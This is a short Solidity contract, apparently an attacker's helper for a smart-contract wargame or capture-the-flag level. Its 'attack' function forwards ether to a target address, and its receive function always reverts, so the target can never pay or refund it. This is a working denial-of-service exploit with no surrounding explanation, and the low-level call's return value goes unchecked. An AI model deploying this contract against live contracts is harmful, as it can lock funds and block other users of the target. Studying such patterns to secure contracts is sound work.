
pragma solidity 0.8.6;

contract call {


function attack(address payable _to) public payable {
   _to.call{value: msg.value}("");
}

receive() external payable{
   revert("sorry");
}
}